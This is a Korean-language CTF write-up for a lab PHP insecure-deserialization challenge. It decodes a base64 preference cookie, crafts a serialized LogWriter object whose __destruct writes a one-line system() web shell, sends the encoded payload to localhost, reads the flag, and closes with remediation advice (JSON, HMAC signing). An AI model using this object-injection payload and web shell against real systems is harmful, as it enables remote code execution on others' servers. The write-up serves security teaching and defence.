+++
title = "VulnABLE CTF [LUXORA] Write-up: Deserialization 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Deserialization", "Bronze", "PHP Object Injection", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Deserialization 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: File & Resource Layer (Deserialization)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/deser/bronze`
- **목표**: 사용자의 세션 정보나 환경 설정이 직렬화(Serialized)되어 쿠키에 저장되는 환경에서, 이 쿠키 값을 변조하여 악의적인 객체를 주입하고 서버 측에서 의도치 않은 메서드(Magic Method)를 실행하게 만들어라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 분석 (Reconnaissance)

`/deser/bronze` 경로에 접속하면 쿠키(Cookie)를 통해 사용자의 선호 설정(Preference)을 관리합니다.
브라우저에 할당된 쿠키 값을 확인해 봅니다.

**[정상 쿠키 값 확인]**
```http
Cookie: prefs=TzoxMToiVXNlclByZWZzIjoyOntzOjU6InRoZW1lIjtzOjQ6ImRhcmsiO3M6ODoibGFuZ3VhZ2UiO3M6MjoiZW4iO30=
```

**[해커의 사고 과정]**
1. 쿠키 값이 Base64로 인코딩되어 있다. 디코딩해보자.
   ```bash
   $ echo "TzoxMToiVXNlclByZWZzIjoyOntzOjU6InRoZW1lIjtzOjQ6ImRhcmsiO3M6ODoibGFuZ3VhZ2UiO3M6MjoiZW4iO30=" | base64 -d
   O:11:"UserPrefs":2:{s:5:"theme";s:4:"dark";s:8:"language";s:2:"en";}
   ```
2. 이건 전형적인 **PHP 직렬화(Serialization)** 포맷이다!
   - `O:11:"UserPrefs":2` ➔ 이름이 11글자인 UserPrefs 객체, 속성 2개.
   - `s:5:"theme";s:4:"dark"` ➔ 5글자 문자열 속성 "theme"의 값은 "dark".
3. 서버는 이 쿠키를 받아서 `unserialize()` 함수로 다시 객체로 되돌릴 것이다.
4. 만약 소스코드 내부에 지워지거나 실행될 때 위험한 동작을 하는 클래스(가젯, Gadget)가 존재한다면, 이 쿠키를 변조해서 해당 클래스를 인스턴스화 시킬 수 있다!

---

## 💥 2. 취약점 식별 및 악성 객체 조립 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Serialized Malicious Object)--> [ Web Server ]
                                                |-- unserialize()
                                                |-- Magic Methods (__destruct) Triggered
                                                |-- RCE / File Write
```


이 챌린지에서는 LFI 등 다른 정보 수집을 통해, 소스코드 내부에 디버깅용으로 남겨둔 `LogWriter` 클래스가 존재한다는 힌트가 주어집니다.

**[서버 내부에 숨겨진 클래스 소스 (가정)]**
```php
class LogWriter {
    public $filename;
    public $content;
    
    // 객체가 소멸(파괴)될 때 자동으로 실행되는 매직 메서드
    public function __destruct() {
        file_put_contents($this->filename, $this->content);
    }
}
```

이 클래스의 `__destruct()` 메서드는 객체가 파괴될 때(즉, 스크립트 실행이 끝날 때) 자신이 가진 `$filename` 에 `$content` 를 무조건 덮어써 버립니다!

### 💡 악성 직렬화 문자열 작성
해커는 `UserPrefs` 객체 대신 이 `LogWriter` 객체를 생성하여, 웹 쉘(`shell.php`)을 생성하도록 조작합니다.

**[작성할 페이로드의 논리적 구조]**
```php
$evil = new LogWriter();
$evil->filename = "shell.php";
$evil->content = "<?php system($_GET['cmd']); ?>";
echo serialize($evil);
```

**[수동으로 작성한 직렬화 문자열]**
```text
O:9:"LogWriter":2:{s:8:"filename";s:9:"shell.php";s:7:"content";s:30:"<?php system($_GET['cmd']); ?>";}
```
이를 다시 Base64로 인코딩합니다.

```bash
$ echo -n 'O:9:"LogWriter":2:{s:8:"filename";s:9:"shell.php";s:7:"content";s:30:"<?php system($_GET['cmd']); ?>";}' | base64
Tzo5OiJMb2dXcml0ZXIiOjI6e3M6ODoiZmlsZW5hbWUiO3M6OToic2hlbGwucGhwIjtzOjc6ImNvbnRlbnQiO3M6MzA6Ijw/cGhwIHN5c3RlbSgkX0dFVFsnY21kJ10pOyA/PiI7fQ==
```

---

## 🚀 3. 공격 수행 및 결과 확인

Burp Suite나 브라우저 개발자 도구를 이용해 쿠키 값을 조작하여 전송합니다.

```http
GET /deser/bronze HTTP/1.1
Host: localhost:3000
Cookie: prefs=Tzo5OiJMb2dXcml0ZXIiOjI6e3M6ODoiZmlsZW5hbWUiO3M6OToic2hlbGwucGhwIjtzOjc6ImNvbnRlbnQiO3M6MzA6Ijw/cGhwIHN5c3RlbSgkX0dFVFsnY21kJ10pOyA/PiI7fQ==
```

### 🔍 서버 내부의 동작
1. 서버는 쿠키를 Base64 디코딩하고 `unserialize()` 함수를 실행합니다.
2. 서버 메모리에 `LogWriter` 객체가 생성됩니다! (인젝션 성공)
3. 스크립트 처리가 끝나고 메모리가 정리될 때, `LogWriter`의 매직 메서드 `__destruct()` 가 자동으로 호출됩니다.
4. 결과적으로 서버의 디렉터리에 `shell.php` 라는 악성 웹 쉘 파일이 덜컥 만들어집니다.

### 🔍 웹 쉘 접근 (RCE 달성)
웹 브라우저로 `http://localhost:3000/shell.php?cmd=cat%20flag.txt` 에 접속합니다.
```text
FLAG{DESER_🥉_PHP_OBJECT_INJECTION_C4D5E6}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

사용자 입력(쿠키)에 대해 안전하지 않은 역직렬화(Insecure Deserialization)를 수행할 때, 공격자가 시스템 내부의 합법적인 코드 조각(Gadget)들을 레고 블록처럼 조립하여 RCE(원격 코드 실행)를 달성하는 과정을 보여주었습니다.

**🔥 획득한 플래그:**
`FLAG{DESER_🥉_PHP_OBJECT_INJECTION_C4D5E6}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
사용자가 통제할 수 있는 데이터를 PHP의 `unserialize()`, Python의 `pickle.loads()`, Java의 `ObjectInputStream.readObject()` 에 그대로 넣는 행위는 **자살 행위**에 가깝습니다.

* **안전한 패치 가이드 (JSON 사용 강제)**
복잡한 객체 상태를 저장하고 복원해야 할 때는, 실행 가능한 '객체' 포맷이 아니라 **순수한 데이터 덩어리인 JSON** 포맷을 사용해야 합니다.

```php
// ❌ 절대 사용 금지 (취약함)
$prefs = unserialize(base64_decode($_COOKIE['prefs']));

// ✅ 안전한 대안 (데이터만 복원됨, 객체의 매직 메서드 실행 불가)
$prefs = json_decode(base64_decode($_COOKIE['prefs']), true);
```
만약 부득이하게 직렬화 포맷을 사용해야 한다면, 데이터가 변조되지 않았음을 보장하기 위해 데이터 전송 시 강력한 암호학적 서명(HMAC)을 결합하여, 서명이 일치할 때만 역직렬화를 수행하도록 구성해야 합니다.